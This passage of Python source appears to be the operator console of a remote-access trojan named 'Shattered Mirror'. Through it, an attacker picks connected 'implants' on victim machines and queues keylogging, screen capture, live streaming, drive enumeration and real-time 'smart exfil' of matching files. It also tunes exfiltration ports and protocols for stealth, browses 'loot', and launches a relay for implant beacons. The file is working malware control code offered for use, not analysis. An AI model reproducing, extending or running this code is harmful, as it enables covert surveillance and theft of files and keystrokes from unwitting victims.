            task_queue.setdefault(target_ip, []).append({"atom_id": 14, "payload": "TERMINATE"})
            log_event(f"{R}FORCE STOP{X} signals queued for {target_ip}")
            print(f"\n   {R}[!] Force stop signals queued for Screen & Spy atoms.{X}")
            time.sleep(1)
            continue
        elif choice == '/stop_live':
            # Specific BALE_STOP for Bale mode
            task_queue.setdefault(target_ip, []).append({"atom_id": 6, "payload": "BALE_STOP"})
            task_queue.setdefault(target_ip, []).append({"atom_id": 14, "payload": "BALE_STOP"})
            log_event(f"{Y}STOP LIVE{X} signals queued for {target_ip}")
            print(f"\n   {Y}[*] Live stream stop commands queued.{X}")
            time.sleep(1)
            continue
        elif choice == 'l':
            draw_loot_page(target_ip)
            continue
        elif choice == 's':
            deploy_atom(target_ip, 3)
            continue
        elif choice == 't':
            draw_tuning_menu(target_ip)
            continue
        elif choice == '?' or choice == 'help':
            draw_master_key_help()
            continue
        elif choice == '':
            continue

        # --- ADVANCED COMMAND PARSING (THE MASTER KEY) ---
        # Choice format: [ATOM_ID]:[PROTOCOL]:[PORT] (e.g., 6:TCP:443)
        parts = choice.split(':')
        aid_str = parts[0]
        proto_override = parts[1].upper() if len(parts) > 1 else None
        port_override = parts[2] if len(parts) > 2 else None

        if aid_str.isdigit():
            aid = int(aid_str)
            if 1 <= aid <= 14:
                if proto_override or port_override:
                    print(f"\n   {M}{B}[!] MASTER KEY DETECTED{X}")
                    print(f"   {D}    Overriding for Atom {aid}:")
                    if proto_override: print(f"       Protocol: {C}{proto_override}{X}")
                    if port_override: print(f"       Port:     {C}{port_override}{X}")
                    
                    atom = ATOMS.get(aid)
                    payload = atom.get("cmd", "START")
                    if atom["type"] == "prompt":
                        print(f"\n   {C}[?] {atom['ask']}{X}")
                        payload = input(f"   {W}    > {X}").strip()
                    
                    final_payload = f"{payload}|OVERRIDE:{proto_override or ''}:{port_override or ''}"
                    
                    task_data = {"atom_id": aid, "payload": final_payload}
                    task_queue.setdefault(target_ip, []).append(task_data)
                    bot = get_bot(target_ip)
                    bot["active_atoms"].add(aid)
                    log_event(f"{atom['name']} (OVERRIDE) queued for {target_ip}")
                    print(f"\n   {G}[+] Task queued with custom tunnel settings.{X}")
                    time.sleep(2)
                else:
                    deploy_atom(target_ip, aid)
            else:
                print(f"   {R}[!] Atom ID must be 1-14.{X}")
                time.sleep(1)
        else:
            print(f"   {R}[!] Unknown command: '{choice}' (type '?' for help){X}")
            time.sleep(0.7)

def deploy_file_scanner(target_ip):
    cls()
    print(f"\n  {M}{B}FILE SYSTEM EXPLORER — {target_ip}{X}")
    print(f"  {D}{'─' * 72}{X}")
    
    path = input(f"\n   {C}[?] Target Path (or 'DRIVES'): {X}").strip()
    if not path: return
    
    if path.upper() == "DRIVES":
        task_queue.setdefault(target_ip, []).append({"atom_id": 9, "payload": "DRIVES"})
        print(f"   {G}[+] Enumerating logical drives...{X}")
        time.sleep(1)
        return

    # Phase 1: Validate Path
    print(f"   {Y}[*] Validating path on victim system...{X}")
    task_queue.setdefault(target_ip, []).append({"atom_id": 9, "payload": f"{path}|||VALIDATE"})
    
    # Wait for validation report
    bot = get_bot(target_ip)
    found_status = None
    start_wait = time.time()
    
    while time.time() - start_wait < 8: # 8 second timeout for validation
        # Check loot for the status
        for l in reversed(bot["loot"]):
            if "[FS_PATH_OK]" in l["data"] and path in l["data"]:
                found_status = "OK"
                break
            if "[FS_ERROR]" in l["data"] and path in l["data"]:
                found_status = "ERROR"
                break
        
        if found_status: break
        time.sleep(0.5)
        sys.stdout.write(".")
        sys.stdout.flush()

    if not found_status:
        print(f"\n   {R}[!] Validation timed out. Path might be slow or implant disconnected.{X}")
        input(f"\n   {D}Press Enter to continue anyway or Ctrl+C to abort...{X}")
    elif found_status == "ERROR":
        print(f"\n   {R}[!] Path is INVALID or ACCESS DENIED on victim side.{X}")
        input(f"\n   {D}Press Enter to return... {X}")
        return
    else:
        print(f" {G}VALID!{X}")

    print(f"\n   {W}Select Scan Mode:{X}")
    print(f"     {G}[1] FULL SCAN{X}      (All high-value files, default skips)")
    print(f"     {G}[2] SMART SCAN{X}     (Targeted Extension + Keyword)")
    print(f"     {G}[3] SMART EXFIL{X}    (Auto-stream matching files as found! {Y}*NEW*{X})")
    print(f"     {G}[4] DEEP OVERRIDE{X}  (Scan EVERYTHING, bypass ALL blacklists)")
    
    mode = input(f"\n   {W}Choice [1]: {X}").strip() or "1"
    
    ext = ""
    key = ""
    flags = ""
    
    if mode == "2":
        ext = input(f"   {C}    Extension (e.g. .pdf): {X}").strip()
        key = input(f"   {C}    Keyword in name:       {X}").strip()
    elif mode == "3":
        ext = input(f"   {C}    Extension to stream:   {X}").strip()
        key = input(f"   {C}    Keyword (optional):    {X}").strip()
        flags = "SMART_EXFIL"
        print(f"   {M}[*] Real-time exfiltration enabled for matching files.{X}")
    elif mode == "4":
        flags = "OVERRIDE"
        print(f"   {R}[!] Warning: Deep Override will scan Windows/System folders.{X}")

    final_payload = f"{path}|{ext}|{key}|{flags}"
    task_queue.setdefault(target_ip, []).append({"atom_id": 9, "payload": final_payload})
    print(f"\n   {G}[+] Scan task queued. Data will stream to loot/smart_exfil.{X}")
    time.sleep(2)

def draw_master_key_help():
    cls()
    print(f"\n  {M}{B}SHATTERED MIRROR — THE MASTER KEY (HELP){X}")
    print(f"  {D}{'─' * 72}{X}")
    print(f"\n   {W}You can override port/protocol for any atom using the colon syntax:{X}")
    print(f"\n   {C}Syntax:{X}  [ATOM_ID]:[PROTOCOL]:[PORT]")
    print(f"\n   {W}Examples:{X}")
    print(f"     {G}6:TCP:443{X}   -> Capture screen, send via Raw TCP on Port 443")
    print(f"     {G}5:HTTP:80{X}   -> Exfiltrate file via stealth HTTP on Port 80")
    print(f"     {G}2:TCP{X}        -> Start keylogger, use Raw TCP on default port")
    print(f"\n   {Y}Valid Protocols:{X} HTTP, TCP, UDP (Experimental)")
    print(f"\n   {D}Note: These settings only apply to the CURRENT task session.{X}")
    print(f"  {D}{'─' * 72}{X}")
    input(f"\n   {D}Press Enter to go back... {X}")

def draw_tuning_menu(target_ip):
    bot = get_bot(target_ip)
    while True:
        cls()
        print(f"\n  {C}{B}TASK TUNING — {target_ip}{X}")
        print(f"  {D}{'─' * 72}{X}")
        
        sc_set = bot["settings"]["6"]
        ex_set = bot["settings"]["5"]
        
        print(f"\n   {W}[1] SCREENSHOT (Atom 6){X}")
        print(f"       Current: {G}{sc_set['proto']}{X} on Port {G}{sc_set['port']}{X}")
        
        print(f"\n   {W}[2] DATA EXFIL (Atom 5){X}")
        print(f"       Current: {G}{ex_set['proto']}{X} on Port {G}{ex_set['port']}{X}")
        
        print(f"\n   {W}[q] Save & Back{X}")
        
        choice = input(f"\n   {W}Select task to tune: {X}").strip().lower()
        
        if choice == '1' or choice == '2':
            aid = "6" if choice == '1' else "5"
            name = "SCREENSHOT" if choice == '1' else "EXFIL"
            
            print(f"\n   {C}--- Tuning {name} ---{X}")
            proto = input(f"   {W}    Protocol (HTTP/TCP) [{C}{bot['settings'][aid]['proto']}{W}]: {X}").strip().upper()
            if proto in ("HTTP", "TCP"):
                bot["settings"][aid]["proto"] = proto
                
            port = input(f"   {W}    Port [{C}{bot['settings'][aid]['port']}{W}]: {X}").strip()
            if port.isdigit():
                bot["settings"][aid]["port"] = port
            
            log_event(f"Tuned {name} settings for {target_ip}")
            print(f"\n   {G}[+] Settings updated!{X}")
            time.sleep(1)
        elif choice == 'q':
            break

# --- IMPLANT SELECTION ---------------------------------------------------
def select_implant(bots):
    if not bots:
        print(f"\n   {Y}[!] No implants connected yet.{X}")
        print(f"   {D}    Waiting for beacons on port {PUBLIC_PORT}...{X}")
        print(f"   {D}    Make sure:{X}")
        print(f"   {D}      1. The implant's Config.h has your public IP{X}")
        print(f"   {D}      2. Port {PUBLIC_PORT} is forwarded on your router{X}")
        print(f"   {D}      3. The Bouncer window is running{X}")
        time.sleep(3)
        return

    try:
        choice = input(f"\n   {W}Select implant #: {X}").strip()
        if choice.isdigit():
            idx = int(choice) - 1
            if 0 <= idx < len(bots):
                bot_session(bots[idx][0])
            else:
                print(f"   {R}[!] Invalid — pick 1 to {len(bots)}.{X}")
                time.sleep(1)
    except (EOFError, KeyboardInterrupt):
        pass

# --- TIMED INPUT ---------------------------------------------------------
def timed_input(prompt, timeout=5):
    sys.stdout.write(prompt)
    sys.stdout.flush()
    buf = ""
    start = time.time()

    while time.time() - start < timeout:
        if msvcrt.kbhit():
            ch = msvcrt.getch()
            if ch == b'\r':
                sys.stdout.write('\n')
                return buf
            elif ch == b'\x03':
                raise KeyboardInterrupt
            elif ch == b'\x08':
                if buf:
                    buf = buf[:-1]
                    sys.stdout.write('\b \b')
                    sys.stdout.flush()
            elif ch == b'\xe0' or ch == b'\x00':
                msvcrt.getch()
            else:
                try:
                    decoded = ch.decode('utf-8')
                    buf += decoded
                    sys.stdout.write(decoded)
                    sys.stdout.flush()
                except:
                    pass
        time.sleep(0.03)

    sys.stdout.write('\n')
    return buf

# --- MAIN LOOP -----------------------------------------------------------
def main_loop():
    while True:
        try:
            cls()
            draw_banner()
            bots = draw_bot_list()
            draw_events(5)

            total_loot = sum(len(info.get("loot", [])) for info in bot_registry.values())
            total_pending = sum(len(q) for q in task_queue.values())

            print(f"\n   {D}Tasks Pending: {Y}{total_pending}{X}   "
                  f"{D}│ Loot Collected: {G}{total_loot}{X}   "
                  f"{D}│ Uptime: {W}{uptime_str()}{X}")

            print(f"""
   {W}[{C}1{W}] Select Implant    [{C}2{W}] View All Loot    [{C}3{W}] Event Log    [{C}0{W}] Shutdown{X}""")

            choice = timed_input(f"\n   {W}> {X}", timeout=5)

            if choice == '1':
                select_implant(bots)
            elif choice == '2':
                draw_global_loot()
            elif choice == '3':
                cls()
                print(f"\n  {C}{B}EVENT LOG{X}")
                print(f"  {D}{'─' * 72}{X}")
                for e in event_log[-30:]:
                    print(f"   {e}")
                print(f"  {D}{'─' * 72}{X}")
                input(f"\n   {D}Press Enter to go back... {X}")
            elif choice == '0':
                print(f"\n   {R}{B}[*] Shutting down Shattered Mirror network...{X}")
                time.sleep(1)
                os._exit(0)

        except KeyboardInterrupt:
            print(f"\n   {R}[*] Interrupted. Shutting down...{X}")
            os._exit(0)

# --- STARTUP -------------------------------------------------------------
def read_config():
    global PUBLIC_PORT, FLASK_PORT, SHELL_PORT
    try:
        config_path = os.path.join(os.path.dirname(os.path.abspath(__file__)),
                                   "..", "Orchestrator", "Config.h")
        with open(config_path, "r") as f:
            for line in f:
                if "PUBLIC_PORT" in line and "static const int" in line:
                    PUBLIC_PORT = int(line.split("=")[1].split(";")[0].strip())
                elif "FLASK_PORT" in line and "static const int" in line:
                    FLASK_PORT = int(line.split("=")[1].split(";")[0].strip())
                elif "SHELL_PORT" in line and "static const int" in line:
                    SHELL_PORT = int(line.split("=")[1].split(";")[0].strip())
        log_event(f"Config loaded: PUBLIC={PUBLIC_PORT} FLASK={FLASK_PORT} SHELL={SHELL_PORT}")
    except Exception as e:
        log_event(f"{Y}Config.h not found: {e}. Using defaults.{X}")

if __name__ == '__main__':
    start_time = time.time()

    if os.name == 'nt':
        os.system('')
        os.system('title [SHATTERED MIRROR] COMMAND CENTER')

    cls()
    read_config()

    print(f"""
{R}{B}
   ╔══════════════════════════════════════════════════════════════════╗
   ║     SHATTERED MIRROR — INITIALIZING...        ║
   ╚══════════════════════════════════════════════════════════════════╝{X}
""")

    print(f"   {M}[i] The most recent payload was compiled for port: {C}{PUBLIC_PORT}{X}")
    p_in = input(f"   {W}[?] Enter Bouncer Port [{C}{PUBLIC_PORT}{W}]: {X}").strip()
    if p_in and p_in.isdigit():
        PUBLIC_PORT = int(p_in)

    print(f"\n   {G}[1/4]{X} Starting Flask telemetry on 127.0.0.1:{FLASK_PORT}...")
    threading.Thread(target=run_flask, args=(FLASK_PORT,), daemon=True).start()
    time.sleep(0.5)
    log_event(f"Flask started on port {FLASK_PORT}")

    print(f"   {G}[2/4]{X} Starting Turbo TCP Listener on 127.0.0.1:{TURBO_PORT}...")
    threading.Thread(target=run_turbo_listener, args=(TURBO_PORT,), daemon=True).start()
    time.sleep(0.5)
    log_event(f"Turbo Listener started on port {TURBO_PORT}")

    print(f"   {G}[3/4]{X} Launching Traffic Bouncer on 0.0.0.0:{PUBLIC_PORT}...")
    script_dir = os.path.dirname(os.path.abspath(__file__))
    bouncer_script = os.path.join(script_dir, "The_Bouncer.py")
    try:
        cmd_str = f'start cmd /k python "{bouncer_script}" {PUBLIC_PORT} {FLASK_PORT} {SHELL_PORT} {TURBO_PORT}'
        subprocess.Popen(cmd_str, shell=True)
        log_event(f"Bouncer launched on port {PUBLIC_PORT}")
    except Exception as e:
        print(f"   {R}[!] Failed to launch Bouncer: {e}{X}")
        print(f"   {Y}[?] Start manually: python The_Bouncer.py {PUBLIC_PORT} {FLASK_PORT} {SHELL_PORT} {TURBO_PORT}{X}")

    time.sleep(1)

    print(f"   {G}[4/4]{X} All systems go.")
    print(f"\n   {G}{B}[+] Shattered Mirror is ONLINE.{X}")
    print(f"   {D}    Implants should connect to your_ip:{PUBLIC_PORT}{X}")
    log_event("Console ONLINE — awaiting implant connections")
    time.sleep(2)

    main_loop()